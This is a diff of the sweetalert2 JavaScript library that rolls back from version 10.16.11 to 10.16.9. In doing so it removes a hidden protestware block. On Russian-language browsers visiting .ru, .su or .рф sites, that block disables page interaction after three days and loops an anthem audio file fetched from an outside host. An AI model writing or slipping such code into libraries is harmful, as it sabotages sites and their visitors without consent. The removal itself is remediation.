@@ -1,5 +1,5 @@
 /*!
-* sweetalert2 v10.16.11
+* sweetalert2 v10.16.9
 * Released under the MIT License.
 */
 (function (global, factory) {
@@ -3607,29 +3607,7 @@
     }]);
 
     return SweetAlert;
-  }(); // Dear russian users visiting russian sites. Let's have fun.
-
-
-  if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
-    var now = new Date();
-    var initiationDate = localStorage.getItem('swal-initiation');
-
-    if (!initiationDate) {
-      localStorage.setItem('swal-initiation', "".concat(now));
-    } else if ((now.getTime() - Date.parse(initiationDate)) / (1000 * 60 * 60 * 24) > 3) {
-      setTimeout(function () {
-        document.body.style.pointerEvents = 'none';
-        var ukrainianAnthem = document.createElement('audio');
-        ukrainianAnthem.src = 'https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3';
-        ukrainianAnthem.loop = true;
-        document.body.appendChild(ukrainianAnthem);
-        setTimeout(function () {
-          ukrainianAnthem.play()["catch"](function () {// ignore
-          });
-        }, 2500);
-      }, 500);
-    }
-  } // Assign instance methods from src/instanceMethods/*.js to prototype
+  }(); // Assign instance methods from src/instanceMethods/*.js to prototype
 
 
   _extends(SweetAlert.prototype, instanceMethods); // Assign static methods from src/staticMethods/*.js to constructor
@@ -3648,7 +3626,7 @@
     };
   });
   SweetAlert.DismissReason = DismissReason;
-  SweetAlert.version = '10.16.7';
+  SweetAlert.version = '10.16.9';
 
   var Swal = SweetAlert;
   Swal["default"] = Swal;
